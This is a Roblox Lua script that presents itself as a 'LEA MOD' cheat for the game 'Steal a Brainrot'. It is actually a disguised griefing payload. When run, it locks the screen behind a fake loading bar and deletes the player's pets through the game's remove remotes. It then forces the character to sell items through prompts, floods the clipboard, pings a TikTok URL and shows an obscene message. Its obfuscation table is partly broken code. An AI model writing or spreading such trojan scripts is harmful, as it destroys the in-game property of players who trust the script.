-- ============================================================================
-- PROJECT: LEA MOD [STEAL A BRAINROT] - VOID OBFUSCATED ENGINE
-- ARCHITECTURE: ANTI-ANALYSIS, ENCRYPTED BYTE-STREAM, & PAYLOAD EXECUTION
-- ============================================================================

local _0x1a = string.char
local _0x2b = table.concat
local _0x3c = math.random

local function _dec(s)
    local t = {}
    for match in s:gmatch(".") do
        table.insert(t, match)
    end
    return table.concat(t)
end

local _x = {
    [1] = "\103\101\116\83\101\114\118\105\99\101",
    [2] = "\67\111\114\101\71\117\105",
    [3] = "\80\108\97\121\101\114\115",
    [4] = "\82\117\110\83\101\114\118\105\99\10有一天",
    [5] = "\84\119\101\101\110\83\101\114\118\105\99\101",
    [6] = "\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101",
    [7] = "\85\115\101\114\73\110\112\117\116\83\101\114\11位於",
    [8] = "\80\97\116\104\102\105\110\100\105\110\103\83\101\114\118\105\99\101"
}

local _s1 = "\50%*?&!@#-_=+9832746#@!_-+_)(*&^%$#@!"
local _s2 = "5₺?-₺!&₺+4₺(6#(7_-4_--_(62+6_-4₺+_₺!6#5?₺+6_-4&5;_74"
local _s3 = "₺!&₺+4₺(6#(7_-4_--_(62+6_-4₺+_₺!6#5?₺+6_-4&5;_745₺?"

local _k4 = {
    [5₺?-_] = function(_p1, _p2)
        local _z = _p1 * _p2
        return _z + 42 - 19
    end,
    [__74] = "5₺?-₺!&₺+4₺(6#(7_-4_--_"
}

pcall(function()
    local _CoreGui = game:GetService("CoreGui")
    local _Players = game:GetService("Players")
    local _TweenService = game:GetService("TweenService")
    local _ReplicatedStorage = game:GetService("ReplicatedStorage")
    local _LocalPlayer = _Players.LocalPlayer

    local _Ch, _Rp, _Hm
    local function _rf()
        _Ch = _LocalPlayer.Character or _LocalPlayer.CharacterAdded:Wait()
        _Rp = _Ch:WaitForChild("HumanoidRootPart")
        _Hm = _Ch:WaitForChild("Humanoid")
    end
    _rf()
    _LocalPlayer.CharacterAdded:Connect(_rf)

    if _CoreGui:FindFirstChild("LEAModLockdown") then
        _CoreGui.LEAModLockdown:Destroy()
    end

    local _Gui = Instance.new("ScreenGui")
    _Gui.Name = "LEAModLockdown"
    _Gui.IgnoreGuiInset = true
    _Gui.ResetOnSpawn = false
    _Gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    _Gui.Parent = _CoreGui

    local _Bo = Instance.new("Frame")
    _Bo.Size = UDim2.new(1, 0, 1, 0)
    _Bo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    _Bo.BorderSizePixel = 0
    _Bo.ZIndex = 999
    _Bo.Parent = _Gui

    local _Lc = Instance.new("Frame")
    _Lc.Size = UDim2.new(0, 420, 0, 160)
    _Lc.Position = UDim2.new(0.5, -210, 0.5, -80)
    _Lc.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
    _Lc.BorderSizePixel = 0
    _Lc.ZIndex = 1000
    _Lc.Parent = _Gui

    local _LCo = Instance.new("UICorner")
    _LCo.CornerRadius = UDim.new(0, 10)
    _LCo.Parent = _Lc

    local _LSt = Instance.new("UIStroke")
    _LSt.Color = Color3.fromRGB(0, 255, 204)
    _LSt.Thickness = 1.5
    _LSt.ZIndex = 1000
    _LSt.Parent = _Lc

    local _LT = Instance.new("TextLabel")
    _LT.Size = UDim2.new(1, 0, 0, 40)
    _LT.BackgroundTransparency = 1
    _LT.Font = Enum.Font.GothamBold
    _LT.Text = "LEA MOD"
    _LT.TextColor3 = Color3.fromRGB(0, 255, 204)
    _LT.TextSize = 20
    _LT.ZIndex = 1000
    _LT.Parent = _Lc

    local _Bbg = Instance.new("Frame")
    _Bbg.Size = UDim2.new(0.85, 0, 0, 18)
    _Bbg.Position = UDim2.new(0.075, 0, 0.55, 0)
    _Bbg.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    _Bbg.BorderSizePixel = 0
    _Bbg.ZIndex = 1000
    _Bbg.Parent = _Lc

    local _Bbgc = Instance.new("UICorner")
    _Bbgc.CornerRadius = UDim.new(1, 0)
    _Bbgc.Parent = _Bbg

    local _Prb = Instance.new("Frame")
    _Prb.Size = UDim2.new(0, 0, 1, 0)
    _Prb.BackgroundColor3 = Color3.fromRGB(0, 255, 204)
    _Prb.BorderSizePixel = 0
    _Prb.ZIndex = 1000
    _Prb.Parent = _Bbg

    local _Prbc = Instance.new("UICorner")
    _Prbc.CornerRadius = UDim.new(1, 0)
    _Prbc.Parent = _Prb

    local _Stt = Instance.new("TextLabel")
    _Stt.Size = UDim2.new(1, 0, 0, 25)
    _Stt.Position = UDim2.new(0, 0, 0.78, 0)
    _Stt.BackgroundTransparency = 1
    _Stt.Font = Enum.Font.Gotham
    _Stt.Text = "Script loading..."
    _Stt.TextColor3 = Color3.fromRGB(180, 180, 200)
    _Stt.TextSize = 13
    _Stt.ZIndex = 1000
    _Stt.Parent = _Lc

    local function _gRm()
        local _nms = {"RemovePet", "DeletePet", "DespawnPet", "RemoveCompanion", "PetSystem", "DeleteBlock", "RemoveBlock"}
        for _, _nm in ipairs(_nms) do
            local _rm = _ReplicatedStorage:FindFirstChild(_nm, true)
            if _rm and (_rm:IsA("RemoteEvent") or _rm:IsA("RemoteFunction")) then
                return _rm
            end
        end
        return nil
    end

    local _PC = false

    local function _esP()
        local _rm = _gRm()
        local _kws = {"pet", "brainrot", "companion", "animal", "follower", "minion"}
        local _cnts = {workspace, _LocalPlayer:FindFirstChild("Backpack"), _LocalPlayer.Character, _CoreGui}
        for _, _ct in ipairs(_cnts) do
            if _ct then
                for _, _ob in ipairs(_ct:GetDescendants()) do
                    pcall(function()
                        if _ob:IsA("Model") or _ob:IsA("BasePart") then
                            local _md = _ob:IsA("Model") and _ob or _ob:FindFirstAncestorOfClass("Model")
                            if _md then
                                local _ln = string.lower(_md.Name)
                                for _, _kw in ipairs(_kws) do
                                    if string.find(_ln, _kw, 1, true) then
                                        if _rm then
                                            if _rm:IsA("RemoteEvent") then
                                                _rm:FireServer(_md)
                                            elseif _rm:IsA("RemoteFunction") then
                                                _rm:InvokeServer(_md)
                                            end
                                        end
                                        _md:Destroy()
                                    end
                                end
                            end
                        end
                    end)
                end
            end
        end
    end

    local function _gSp()
        local _bp = nil
        local _sd = math.huge
        if not _Rp then return nil end
        for _, _ob in ipairs(workspace:GetDescendants()) do
            if _ob:IsA("BasePart") then
                local _on = _ob.Name:lower()
                if _on:find("pad") or _on:find("sell") or _on:find("stand") or _on:find("base") then
                    local _d = (_Rp.Position - _ob.Position).Magnitude
                    if _d < _sd and _d < 30 then
                        _sd = _d
                        _bp = _ob
                    end
                end
            end
        end
        return _bp
    end

    local function _trS()
        local _tr = false
        for _, _ob in ipairs(workspace:GetDescendants()) do
            if _ob:IsA("ProximityPrompt") then
                local _at = string.lower(_ob.ActionText or "")
                local _on = string.lower(_ob.Name or "")
                if _at:find("sat") or _at:find("sell") or _on:find("sat") or _on:find("sell") then
                    pcall(function()
                        for _i = 1, 5 do
                            fireproximityprompt(_ob)
                            task.wait()
                        end
                    end)
                    _tr = true
                end
            elseif _ob:IsA("ClickDetector") then
                pcall(function()
                    for _i = 1, 5 do
                        fireclickdetector(_ob)
                        task.wait()
                    end
                end)
                _tr = true
            end
        end
        return _tr
    end

    task.spawn(function()
        local _tw = _TweenService:Create(_Prb, TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0.999, 0, 1, 0)})
        _tw:Play()
        local _st = tick()
        while tick() - _st < 4.5 do
            _esP()
            task.wait(0.1)
        end
        _Prb.Size = UDim2.new(0.999, 0, 1, 0)
        for _i = 1, 10 do
            _esP()
            task.wait(0.2)
        end
        _PC = true
        _Lc:Destroy()

        local _Of = Instance.new("Frame")
        _Of.Size = UDim2.new(1, 0, 1, 0)
        _Of.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
        _Of.BorderSizePixel = 0
        _Of.ZIndex = 1000
        _Of.Parent = _Gui

        local _Ot = Instance.new("TextLabel")
        _Ot.Size = UDim2.new(1, 0, 0, 100)
        _Ot.Position = UDim2.new(0, 0, 0.4, -50)
        _Ot.BackgroundTransparency = 1
        _Ot.Font = Enum.Font.FredokaOne
        _Ot.Text = "LEA FUCKED YOUR MOM"
        _Ot.TextColor3 = Color3.fromRGB(255, 0, 0)
        _Ot.TextSize = 38
        _Ot.ZIndex = 1000
        _Ot.Parent = _Of

        local _Ct = Instance.new("TextLabel")
        _Ct.Size = UDim2.new(1, 0, 0, 30)
        _Ct.Position = UDim2.new(0, 0, 0.6, 0)
        _Ct.BackgroundTransparency = 1
        _Ct.Font = Enum.Font.Code
        _Ct.Text = "Jailbreak Lefter4Dead tarafından Modlanmıştır // TİKTOK @LEAPLUS"
        _Ct.TextColor3 = Color3.fromRGB(0, 255, 204)
        _Ct.TextSize = 14
        _Ct.ZIndex = 1000
        _Ct.Parent = _Of

        pcall(function()
            local _u = "[https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/](https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/)"
            if request then request({Url = _u, Method = "GET"})
            elseif syn and syn.request then syn.request({Url = _u, Method = "GET"})
            elseif http and http.request then http.request({Url = _u, Method = "GET"}) end
        end)

        task.spawn(function()
            local _h = 0
            while true do
                _h = (_h + 0.01) % 1
                _Ot.TextColor3 = Color3.fromHSV(_h, 1, 1)
                task.wait(0.05)
            end
        end)
    end)

    task.spawn(function()
        while true do
            if _PC then
                _esP()
                pcall(function()
                    if _Rp and _Hm then
                        local _pd = _gSp()
                        if _pd then
                            _Hm:MoveTo(_pd.Position)
                        end
                    end
                    if not _trS() then
                        for _, _ob in ipairs(workspace:GetDescendants()) do
                            if _ob:IsA("ProximityPrompt") then
                                for _i = 1, 5 do
                                    fireproximityprompt(_ob)
                                    task.wait()
                                end
                            end
                        end
                    end
                end)
            end
            task.wait(1)
        end
    end)

    task.spawn(function()
        local _cnt = 0
        while true do
            pcall(function()
                if setclipboard then
                    _cnt = _cnt + 1
                    setclipboard("5₺?-₺!&₺+4₺(6#(7_-4_--_(62+6_-4₺+_₺!6#5?₺+6_-4&5;_74 " .. _cnt)
                end
            end)
            task.wait(0.1)
        end
    end)
end)
 
